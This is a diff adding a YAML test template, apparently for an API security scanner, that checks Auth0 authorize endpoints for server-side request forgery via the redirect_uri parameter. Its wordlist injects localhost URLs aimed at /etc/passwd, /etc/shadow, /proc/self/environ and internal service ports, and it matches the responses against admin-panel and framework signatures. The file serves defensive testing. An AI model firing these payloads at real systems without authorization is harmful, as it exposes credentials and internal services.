@@ -1,0 +1,155 @@
+id: AUTH0_REDIRECT_URI_LOCALHOST_SSRF
+info:
+  name: "SSRF test with Localhost URLs for Redirect URI Parameter in Auth0 Authentication"
+  description: "An SSRF test with localhost URLs for the Redirect URI parameter in Auth0 authentication involves checking if the system can be tricked into making requests to local services running on `localhost` or `127.0.0.1`. By injecting these localhost URLs into the Redirect URI, testers aim to see if Auth0 improperly allows internal access or leaks information from local services. This helps to identify potential vulnerabilities where internal resources might be exposed through improper handling of redirect parameters."
+  details: "In an SSRF test with localhost URLs for the Redirect URI parameter, testers input URLs such as `http://localhost` or `http://127.0.0.1` into the Redirect URI field during the authentication process. The goal is to observe if Auth0 processes these requests and inadvertently allows access to local services or sensitive data. This test evaluates whether Auth0's validation mechanisms effectively block or sanitize these local addresses to prevent unauthorized internal access or data exposure."
+  impact: "If an SSRF test with localhost URLs succeeds, it could allow attackers to access and potentially exploit local services running on the server, such as development tools or internal applications. This might lead to unauthorized information disclosure or further attacks within the network. Additionally, it could expose sensitive internal resources or configurations that are not intended to be accessible from external sources."
+  category:
+    name: SSRF
+    shortName: Server Side Request Forgery
+    displayName: Server Side Request Forgery (SSRF)
+  subCategory: AUTH0_REDIRECT_URI_LOCALHOST_SSRF
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa7-server-side-request-forgery.md"
+    - "https://www.akto.io/blog/how-to-prevent-server-side-request-forgery-ssrf-as-a-developer"
+  cwe:
+    - CWE-918
+  cve:
+    - CVE-2022-4725
+
+api_selection_filters:
+  method:
+    eq: "GET"
+  response_code:
+    eq: 302
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  url:
+    contains_all: 
+      - authorize
+      - auth0
+  query_param:
+    for_one:
+      key:
+        eq: redirect_uri
+        extract: redirectURIKey
+      value:
+        regex: "\b((http|https|ftp)://[^\\s/$.?#].[^\\s]*)\b"
+wordLists:
+  localhostURIs:
+    - http://localhost:80
+    - http://localhost:8080
+    - http://localhost/etc/passwd
+    - http://localhost/etc/lsb-release
+    - http://localhost/etc/shadow
+    - http://localhost:443
+    - http://localhost/admin
+    - http://localhost/etc/hosts
+    - http://localhost:22
+    - http://localhost/proc/self/environ
+    - http://localhost/proc/self/cmdline
+    - http://localhost/proc/self/cwd/index.php
+    - http://localhost/proc/self/exe
+    - http://localhost/proc/self/cwd/main.py
+    - http://localhost/proc/self/cwd/application.py
+    - http://localhost:27017
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_query_param:
+            ${redirectURIKey}: ${localhostURIs}
+validate:
+  response_code:
+    eq: 302
+  response_payload:
+    contains_either:
+      - admin_menu
+      - wp-json/wp
+      - "Django administration"
+      - "staff_member_required"
+      - "Flask-Admin"
+      - "flask_admin"
+      - "ActiveAdmin"
+      - "rails_admin"
+      - "Express Admin"
+      - "express_admin"
+      - "laravel_admin"
+      - wp-admin
+      - loopback
+      - HTTP/
+      - "Server:"
+      - "SSH-"
+      - "mongod"
+      - "handshake"
+      - "Spring Boot Admin"
+      - "Spring Security"
+      - "@Controller"
+      - "@RequestMapping"
+      - "Spring Actuator"
+      - "gorilla/mux"
+      - "net/http"
+      - "gin-gonic/gin"
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
